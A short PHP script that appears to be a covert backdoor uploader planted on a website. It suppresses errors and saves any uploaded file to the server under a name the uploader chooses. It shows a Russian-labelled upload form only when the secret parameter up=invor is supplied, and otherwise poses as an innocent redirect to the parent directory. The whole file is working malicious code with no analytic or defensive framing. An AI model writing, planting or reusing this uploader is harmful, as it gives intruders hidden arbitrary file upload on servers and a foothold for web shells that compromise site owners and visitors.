<?php
error_reporting(0);
if(copy($_FILES["filename"]["tmp_name"],
$_FILES["filename"]["name"])) {}
if($_GET['up']==invor) { 
echo'<form action="#" method="post" enctype="multipart/form-data">
<input type="file" name="filename"><br> 
<input type="submit" value="Загрузить"><br>
</form>';  }
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");

header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

header("Location: ../");
exit;